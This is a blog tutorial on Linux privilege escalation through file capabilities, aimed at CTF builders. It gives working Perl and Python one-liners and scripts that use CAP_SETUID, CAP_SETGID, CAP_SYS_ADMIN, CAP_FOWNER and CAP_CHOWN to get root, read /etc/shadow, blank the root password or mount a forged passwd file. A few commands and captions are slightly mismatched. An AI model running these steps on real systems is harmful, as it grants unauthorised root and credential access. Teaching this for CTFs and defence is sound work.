---
title: Linux Privilege Escalation - Capabilities  for CTF Creators
draft: false
author: "pwnlog"
authorLink: ""
description: ""
license: ""
images: []
date: 2021-12-28 11:32:00 +0800
categories: [Linux Privilege Escalation]
tags: [capabilities, cap_setuid, cap_setgid, cap_sys_admin, cap_chown, cap_fowner]

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: false
rssFullText: false

code:
  copy: true
  maxShownLines: -1
  # ...
math:
  enable: true
  # ...
mapbox:
  accessToken: ""
  # ...
share:
  enable: true
  # ...
comment:
  enable: true
  # ...
library:
  css:
    # someCSS = "some.css"
    # located in "assets/"
    # Or
    # someCSS = "https://cdn.example.com/some.css"
  js:
    # someJS = "some.js"
    # located in "assets/"
    # Or
    # someJS = "https://cdn.example.com/some.js"
seo:
  images: []
  # ...

summary: "Permissions or capabilities?"
---

# Capabilities

In UNIX systems, there are two categories of processes:

### Privileged Processes
- **Effective UID is zero (0)**, referred to as root.
- **Bypasses kernel permissions checks**.

### Unprivileged Processes
- **Effective UID is nonzero**.
- **Full permissions checking is required**.

Since the release of kernel 2.2, Linux has divided the privileges associated with the superuser into units known as capabilities. These capabilities can be enabled or disabled. For more information about capabilities, please refer to the official documentation.

## Capabilities Commands

These are the commands that we can use for working with capabilities:
- setcap - Set File Capabilities
- setpcaps - Set Process Capabilities
- getcap - Get File Capabilities
- getpcaps – Get Process Capabilities
- capsh - Capability Shell Wrapper

## Process Capabilities

We can find the capabilities of the current process with either of the following commands:

```shell
cat /proc/self/status || capsh --print
```

We can find the capabilities of another user with:

```shell
cat /proc/<pid>/status
```

These can be decoded with capsh:

```shell
❯ cat /proc/1911963/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000000000
CapEff:    0000000000000000
CapBnd:    000001ffffffffff
CapAmb:    0000000000000000

❯ capsh --decode=000001ffffffffff
0x000001ffffffffff=cap_chown,cap_dac_override...<SNIP>...
```

## Dropping Capabilities with Capsh

If we drop the CAP_NET_RAW capabilities for ping, then the ping utility should no longer work:

```shell
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

Besides the output of capsh itself, the tcpdump command itself should also raise an error.

## Working with Capabilities

We can use setcap to add capabilities to a file:


```shell
setcap cap_setuid+ep <filename>
```

We can examine capabilities with getcap:

```shell
getcap <filename>
```

We can search for all capabilities:

```shell
getcap –r <filename>
```

We can remove capabilities with setcap:

```shell
setcap
```

## Dangerous Capabilites

The following capabilities are particularly dangerous and should be investigated further if found enabled on a system:

| Capabilities Name   | Description                                                                                                                                 |
|---------------------|---------------------------------------------------------------------------------------------------------------------------------------------|
| CAP_AUDIT_CONTROL   | Allow to enable/disable kernel auditing                                                                                                     |
| CAP_AUDIT_WRITE     | Helps to write records to kernel auditing log                                                                                               |
| CAP_BLOCK_SUSPEND   | This feature can block system suspends                                                                                                      |
| CAP_CHOWN           | Allow user to make arbitrary change to files UIDs and GIDs                                                                                  |
| CAP_DAC_OVERRIDE    | This helps to bypass file read, write and execute permission checks                                                                         |
| CAP_DAC_READ_SEARCH | This only bypass file and directory read/execute permission checks                                                                          |
| CAP_FOWNER          | This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file |
| CAP_KILL             | Allow the sending of signals to processes belonging to others |
| CAP_SETGID           | Allow changing of the GID                                     |
| CAP_SETUID           | Allow changing of the UID                                     |
| CAP_SETPCAP          | Helps to transferring and removal of current set to any PID   |
| CAP_IPC_LOCK         | This helps to lock memory                                     |
| CAP_MAC_ADMIN        | Allow MAC configuration or state changes                      |
| CAP_NET_RAW          | Use RAW and PACKET sockets                                    |
| CAP_NET_BIND_SERVICE | SERVICE Bind a socket to internet domain privileged ports     |
| CAP_SYS_ADMIN     | This means that you can mount/umount filesystems.                                                                  |
| CAP_SYS_PTRACE    | This means that you can escape the container by injecting a shellcode inside some process running inside the host. |
| CAP_SYS_MODULE    | This means that you can insert/remove kernel modules in/from the kernel of the host machine.                       |
| OTHERS.....       |                                                                                                                    |:


# Privilege Escalation via CAP_SETUID

The CAP_SETUID capability allows a process to set the user ID (UID) of a process. This is crucial for operations that require changing the effective user ID, real user ID, or saved set-user-ID of a process. Essentially, it enables a process to assume the identity of another user, which is typically necessary for tasks that require elevated privileges.

## Perl Example

Copy the python3 binary to our current working directory:

```shell
cp $(which perl) . 
```

Assign the `cap_setuid` capability:

```shell
sudo setcap cap_setuid+ep ./perl 
```

We can review the capability with the following:

```shell
getcap ./perl

# Output
./perl cap_setuid=ep
```

Run a bash with `uid` of `0` as shown in the variable `$uid = 0` which is the root UID, and bash with `exec("/bin/bash")`:

```shell
./perl -e 'my $uid = 0; $< = $uid; $> = $uid; exec("/bin/bash");'
```

This will result in root:

```sh
root@pwn:~# id
uid=0(root) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
```

## Python Example

We'll copy the python3 binary to our current working directory:

```shell
cp $(which python3) . 
```

Then we'll assign the `cap_setuid` capability to the python3 executable that's in the current folder:

```shell
sudo setcap cap_setuid+ep ./python3 
```

We can review the capability with the following:

```shell
getcap ./python3
```

Run a bash shell with `setuid` of `0` as shown in `os.setuid(0)` which is the root UID, and bash with `os.system("/bin/bash")`:

```shell
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

This will also result in root:

```sh
root@pwn:~# id
uid=0(root) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
```

# Privilege Escalation via CAP_SETGID

The CAP_SETGID capability allows a process to set the group ID (GID) of a process. This capability is similar to CAP_SETUID but applies to group IDs. It allows a process to change its effective group ID, real group ID, or saved set-group-ID. This is important for operations that need to change the group identity of a process, enabling it to perform actions on behalf of a different group.

## Perl Example

Copy the Perl binary to the current folder:

```sh
cp $(which perl) . 
```

The capability `CAP_SETGID` allows us to **set the `EGID` of the created process**.

```shell
user@pwn:~$ sudo /usr/sbin/setcap cap_setgid+ep ./perl
user@pwn:~$ getcap -r ./perl
./perl = cap_setgid+ep
```

View the groups:

```shell
user@pwn:~$ cat /etc/group | grep shadow
shadow:x:42:
```

Run this Perl code:

```python
./perl -e 'my $gid = 42; $< = $gid; $> = $gid; exec("/bin/bash");'
./perl -e '$) = 42; exec("/bin/bash");'   
```

In this case, the `shadow` group was impersonated so we can read the file `/etc/shadow`:

```shell
user@pwn:~$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1610 oct 25 25:45 /etc/shadow
user@pwn:~$ groups
shadow adm cdrom sudo dip plugdev lpadmin lxd sambashare user
user@pwn:~$ id
uid=1000(user) gid=42(shadow) grupos=42(shadow)
user@pwn:~$ cat /etc/shadow
root:$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.:18918:0:99999:7:::
<...SNIP...>
```

## Python Example

Copy the Python binary to the current folder:

```sh
cp $(which python3) . 
```

The capability `CAP_SETGID` allows us to **set the `EGID` of the created process**.

```shell
user@pwn:~$ sudo /usr/sbin/setcap cap_setgid+ep ./python3
user@pwn:~$ getcap -r ./python3
./python3 = cap_setgid+ep
user@pwn:~$ vim setgid.py
```

View the groups:

```shell
user@pwn:~$ cat /etc/group | grep shadow
shadow:x:42:
```

Add this Python code:

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

In this case, the `shadow` group was impersonated so we can read the file `/etc/shadow`:

```shell
user@pwn:~$ ./python3 setgid.py
user@pwn:~$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1610 oct 25 25:45 /etc/shadow
user@pwn:~$ groups
shadow adm cdrom sudo dip plugdev lpadmin lxd sambashare user
user@pwn:~$ id
uid=1000(user) gid=42(shadow) grupos=42(shadow)
user@pwn:~$ cat /etc/shadow
root:$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.:18918:0:99999:7:::
<...SNIP...>
```

# Privilege Escalation via CAP_SYS_ADMIN

The CAP_SYS_ADMIN capability is one of the most powerful and broad capabilities in the Linux system. It grants a wide range of administrative privileges that are not covered by other specific capabilities. Here are some of the key functions and permissions associated with CAP_SYS_ADMIN:

- Mounting and Unmounting Filesystems: Allows mounting and unmounting of filesystems.
- Setting Disk Quotas: Enables setting disk quotas for users.
- Modifying Kernel Parameters: Permits modification of certain kernel parameters.
- Performing System Reboots: Allows the system to be rebooted.
- Bypassing File Read, Write, and Execute Permissions: Grants the ability to bypass file permissions in certain contexts.
- Managing Namespaces: Allows creation and management of namespaces.
- Accessing Raw Sockets: Permits access to raw sockets, which can be used for network packet manipulation.

Due to its extensive range of permissions, CAP_SYS_ADMIN is often considered a "catch-all" capability, and it is crucial to use it with caution. Misuse or overuse of this capability can lead to significant security risks.

## Mounting File System Example

This means that we can **mount/umount filesystems**.

```shell
user@pwn:~$ cp $(which perl) .
user@pwn:~$ ls perl
perl
user@pwn:~$ sudo /usr/sbin/setcap cap_sys_admin+ep ./perl
user@pwn:~$ getcap -r ./perl
./perl = cap_sys_admin+ep
```

Using Python we can mount a modified `passwd` file on top of the real `passwd` file:

```shell
user@pwn:~$ cp /etc/passwd ./
user@pwn:~$ openssl passwd -1 -salt abc password
$1$xxxxxxxxxxxxxxxxx/
user@pwn:~$ vim ./passwd
user@pwn:~$ head -n 1 ./passwd
root:$1$xxxxxxxxxxxxxxxxxxx/:0:0:root:/root:/bin/bash
```

Install the required modules:

```sh
cpan Sys::Syscall
```

Replace the `/etc/passwd` file by creating the following Perl script:

```perl
#!/usr/bin/perl

use strict;
use warnings;

# Change the source path
my $source = "/home/user/passwd";
my $target = "/etc/passwd";

# File System and Options
my $filesystemtype = "none";
my $options = "rw";
my $mountflags = 4096;  # MS_BIND

# Determine the system call number for mount
my $syscall_number = determine_syscall_number("mount");

# Invoke the system call directly
my $ret = syscall($syscall_number, $source, $target, $filesystemtype, $mountflags, $options);

if ($ret == -1) {
    die "Error mounting: $!";
}

print "Mount successful.\n";

# Helper function to determine the system call number
sub determine_syscall_number {
    my ($syscall_name) = @_;
    
    my $syscall_number = eval {
        require 'syscall.ph';
        eval "&SYS_$syscall_name";
    };

    die "Unable to determine the system call number for $syscall_name: $@" if $@;
    die "Unable to determine the system call number for $syscall_name" unless defined $syscall_number;

    return $syscall_number;
}
```

In the above Perl code, we define a Perl subroutine named `$mount` that wraps the `libc.mount` function.

After that, we define the necessary variables (`$source`, `$target`, `$filesystemtype`, `$options`, and `$mountflags`) with the corresponding values.

The code also includes a helper function, `determine_syscall_number`, which attempts to determine the system call number for a given syscall name (mount in this case). It uses the `syscall.ph` file, which should be present on your system, to determine the number. The code then invokes the system call using the determined number.

Please note that the determination of the system call number relies on the presence of the `syscall.ph` file and the correct mapping of the syscall names. In some cases, additional steps may be required to ensure that the `syscall.ph` file is available and up to date.

We could then mount the modified passwd file on `/etc/passwd`:

```shell
user@pwn:~$ ./perl cap_sys_admin.pl
user@pwn:~$ cat /etc/passwd
root:$1$xxxxxxxxxxxxxxxxxxxx/:0:0:root:/root:/bin/bash
```

Then we can switch to the root user with the password provided:

```shell
user@pwn:~$ su root
Password:
root@pwn:/home/user# id
uid=0(root) gid=0(root) grupos=0(root)
```

# Privilege Escalation via CAP_FOWNER

The `CAP_FOWNER` capability in Linux allows a process to bypass file ownership checks. This means that a process with this capability can perform operations on files as if it were the owner of those files. Here are some key points about `CAP_FOWNER`:

1. **Bypass Ownership Checks**: It allows processes to ignore the ownership of files when performing operations such as reading, writing, or executing.
2. **Modify File Attributes**: Processes can change file attributes, such as permissions, without being the file owner.
3. **Override Restrictions**: It can override certain restrictions that are normally enforced based on file ownership, providing greater flexibility in managing files.

This capability is particularly useful for system administrators and certain system processes that need to manage files across different users without being restricted by file ownership. However, it should be used with caution, as it can pose security risks if misused.

## Perl Example

Copy the Perl binary to the current folder:

```sh
cp $(which perl) . 
```

The capability `CAP_FOWNER` allows us to **change the permission of a file**.

```shell
user@pwn:~$ sudo /usr/sbin/setcap cap_fowner+ep ./perl
user@pwn:~$ getcap -r ./perl
./perl = cap_fowner+ep
```

The original `/etc/shadow` permissions are the following:

```shell
user@pwn:~$ ls -la /etc/shadow
-rw-r----- 1 root shadow 1610 oct 25 15:44 /etc/shadow
```

If Python has this capability we can modify the permissions of the shadow file, then change the root password, and as a result, elevate privileges:

```shell
./perl -e 'chmod 0666, "/etc/shadow"'
```

Change the root password:

```shell
user@pwn:~$ ls -la /etc/shadow
-rw-rw-rw- 1 root shadow 1610 oct 25 15:44 /etc/shadow
user@pwn:~$ vim /etc/shadow
user@pwn:~$ cat /etc/passwd | grep ^root
root::0:0:root:/root:/bin/bash # Doesn't matter if it has the x
user@pwn:~$ cat /etc/shadow | grep ^root
root::18918:0:99999:7:::
```

Elavate to the root user:

```shell
user@pwn:~$ vim /etc/passwd
user@pwn:~$ su root
root@pwn:/home/user# exit
exit
user@pwn:~$ cat /etc/passwd | grep ^root
root:x:0:0:root:/root:/bin/bash # With the x
user@pwn:~$
```

## Python Example

The capability `CAP_FOWNER` allows us to **change the permission of a file**.

```shell
user@pwn:~$ sudo /usr/sbin/setcap cap_fowner+ep ./python3
user@pwn:~$ getcap -r ./python3
./python3 = cap_fowner+ep
```

The original `/etc/shadow` permissions are the following:

```shell
user@pwn:~$ ls -la /etc/shadow
-rw-r----- 1 root shadow 1610 oct 25 15:44 /etc/shadow
```

If Python has this capability we can modify the permissions of the shadow file, then change the root password, and as a result, elevate privileges:

```shell
./python3 -c 'import os;os.chmod("/etc/shadow",0o666)'
```

Change the root password:

```shell
user@pwn:~$ ls -la /etc/shadow
-rw-rw-rw- 1 root shadow 1610 oct 25 15:44 /etc/shadow
user@pwn:~$ vim /etc/shadow
user@pwn:~$ cat /etc/passwd | grep ^root
root::0:0:root:/root:/bin/bash # Doesn't matter if it has the x
user@pwn:~$ cat /etc/shadow | grep ^root
root::18918:0:99999:7:::
```

Elevate to the root user:

```shell
user@pwn:~$ vim /etc/passwd
user@pwn:~$ su root
root@pwn:/home/user# exit
exit
user@pwn:~$ cat /etc/passwd | grep ^root
root:x:0:0:root:/root:/bin/bash # With the x
user@pwn:~$
```

# Privilege Escalation via CAP_CHOWN

The capability `CAP_CHOWN` allows us to **change the ownership of any file**.

```shell
user@pwn:~$ sudo /usr/sbin/setcap cap_chown+ep ./python3
user@pwn:~$ getcap -r ./python3
./python3 = cap_chown+ep
```

Let's suppose the Python binary has this capability, we can change the owner of the shadow file, change the root password, and escalate privileges:

```shell
user@pwn:~$ cat /etc/passwd | grep ^user
user:x:1000:1000:user,,,:/home/user:/bin/bash
./python3 -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

Now we can read the /etc/shadow file:

```shell
user@pwn:~$ ./python3 -c 'import os;os.chown("/etc/shadow",1000,1000)'
user@pwn:~$ ls -la /etc/shadow
-rw-r----- 1 user user 1610 oct 25 12:40 /etc/shadow
user@pwn:~$ cat /etc/shadow
root:$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.:18918:0:99999:7:::
daemon:*:18667:0:99999:7:::
```

# Defense 

Defending against capabilities can be challenging. Here are some key points to consider:

- Avoid using unnecessary capabilities: Only enable capabilities that are essential for the task at hand.
- Ensure capabilities cannot be exploited: Regularly review and audit capabilities to prevent potential abuse.